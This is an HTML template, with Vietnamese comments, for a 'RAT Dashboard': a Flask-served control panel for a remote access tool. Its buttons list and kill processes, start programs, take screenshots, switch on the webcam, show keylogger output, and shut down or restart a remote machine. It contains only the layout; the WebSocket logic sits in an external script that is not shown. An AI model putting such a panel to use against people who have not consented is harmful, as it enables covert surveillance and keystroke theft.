<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Dashboard</title>
    <style>
        /* CSS Cơ bản để chia layout */
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f4f4f9; }
        h1 { text-align: center; color: #333; }

        .container {
            display: flex;
            gap: 20px;
            height: 85vh;
        }

        /* --- CỘT TRÁI: CÁC NÚT ĐIỀU KHIỂN --- */
        .sidebar {
            width: 300px;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            display: flex;
            flex-direction: column;
            gap: 10px;
            overflow-y: auto;
        }

        .btn {
            padding: 12px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.2s;
            text-align: left;
        }
        .btn:hover { opacity: 0.9; transform: translateX(5px); }
        .btn-primary { background-color: #007bff; color: white; }
        .btn-warning { background-color: #ffc107; color: black; }
        .btn-danger { background-color: #dc3545; color: white; }
        .btn-info { background-color: #17a2b8; color: white; }

        .input-group {
            margin-top: 10px;
            padding: 10px;
            background: #eee;
            border-radius: 5px;
        }
        .input-group input { width: 95%; padding: 5px; margin-bottom: 5px; }

        /* --- CỘT PHẢI: HIỂN THỊ KẾT QUẢ --- */
        .main-display {
            flex: 1;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* Các chế độ hiển thị (View Modes) */
        .view-section { display: none; height: 100%; overflow-y: auto; }
        .view-section.active { display: block; }

        /* 1. Style cho Table (App/Process) */
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; border-bottom: 1px solid #ddd; text-align: left; }
        th { background-color: #f8f9fa; position: sticky; top: 0; }
        .btn-kill { background: #dc3545; color: white; padding: 5px 10px; border: none; border-radius: 3px; cursor: pointer; }

        /* 2. Style cho Image (Webcam/Screen) */
        .media-container { text-align: center; height: 100%; display: flex; align-items: center; justify-content: center; background: #000; }
        #monitor-img { max-width: 100%; max-height: 100%; object-fit: contain; }

        /* 3. Style cho Keylog */
        #keylog-area { width: 100%; height: 95%; padding: 10px; font-family: monospace; background: #222; color: #0f0; border: none; resize: none; }
        
        /* Footer log nhỏ */
        .status-bar { margin-top: 10px; padding: 10px; background: #e9ecef; border-radius: 5px; font-size: 0.9em; color: #555; }
    </style>
</head>
<body>

    <h1>Remote Control Dashboard</h1>
    
    <div class="container">
        <!-- CỘT TRÁI -->
        <div class="sidebar">
            <h3>Điều khiển</h3>
            
            <!-- Nhóm 1: App & Process -->
            <button class="btn btn-primary" onclick="requestList('LIST_APPS')">1. Danh sách Apps</button>
            <button class="btn btn-primary" onclick="requestList('LIST_PROCESS')">2. Danh sách Process</button>
            
            <!-- Khu vực Start App mới -->
            <div class="input-group">
                <label>Start New App:</label>
                <input type="text" id="app-path" placeholder="Nhập tên (vd: notepad.exe)">
                <button class="btn btn-success" style="width:100%" onclick="startApp()">Start</button>
            </div>

            <hr style="width:100%">

            <!-- Nhóm 2: Màn hình & Webcam -->
            <button class="btn btn-info" onclick="requestScreenshot()">3. Chụp màn hình</button>
            <button class="btn btn-info" id="btn-webcam" onclick="toggleWebcam()">4. Bật Webcam</button>

            <!-- Nhóm 3: Keylog -->
            <button class="btn btn-warning" onclick="startKeylog()">5. Xem Keylogger</button>

            <hr style="width:100%">

            <!-- Nhóm 4: Nguồn -->
            <button class="btn btn-danger" onclick="confirmAction('RESTART')">6. Restart Máy</button>
            <button class="btn btn-danger" onclick="confirmAction('SHUTDOWN')">7. Shutdown Máy</button>
            
            <div class="status-bar" id="status-log">Trạng thái: Đang chờ...</div>
        </div>

        <!-- CỘT PHẢI -->
        <div class="main-display">
            <h2 id="view-title">Màn hình hiển thị</h2>
            
            <!-- View 1: Bảng dữ liệu (Apps/Process) -->
            <div id="view-table" class="view-section">
                <table>
                    <thead>
                        <tr>
                            <th>ID (PID)</th>
                            <th>Tên tiến trình</th>
                            <th>Hành động</th>
                        </tr>
                    </thead>
                    <tbody id="table-body">
                        <!-- Dữ liệu sẽ được JS thêm vào đây -->
                    </tbody>
                </table>
            </div>

            <!-- View 2: Hình ảnh (Screenshot/Webcam) -->
            <div id="view-media" class="view-section">
                <div class="media-container">
                    <img id="monitor-img" src="" alt="Chưa có hình ảnh" />
                </div>
            </div>

            <!-- View 3: Keylog -->
            <div id="view-keylog" class="view-section">
                <textarea id="keylog-area" readonly placeholder="Các phím nhấn sẽ hiện ở đây..."></textarea>
            </div>
        </div>
    </div>

    <script>
        // Nhận biến từ Flask truyền sang
        const GATEWAY_CONFIG = "{{ ws_server }}";
    </script>
    
    <!-- Load file logic bên ngoài -->
    <script src="{{ url_for('static', filename='main.js') }}"></script>
    
    <script>
        // Khởi chạy khi load xong file main.js
        window.onload = function() {
            initWebSocket(GATEWAY_CONFIG);
        };
    </script>
</body>
</html>
